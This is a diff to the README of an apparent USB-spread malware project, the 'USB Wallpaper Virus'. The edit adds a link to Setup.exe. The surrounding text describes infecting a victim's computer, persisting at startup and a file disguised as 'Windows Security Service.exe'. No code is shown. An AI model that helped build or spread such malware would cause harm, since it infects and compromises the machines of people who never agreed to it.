@@ -18,7 +18,7 @@ Keep in mind, **once set up, the USB drive is infinitely useable** for spreading
 Your victim's computer is now infected with the USB Wallpaper Virus.
 
 ## Files
-### Setup.exe
+### [Setup.exe](../main/Setup.exe)
 Copies and moves files, sets up the program, and makes sure it runs at startup.
 
 ### Windows Security Service.exe
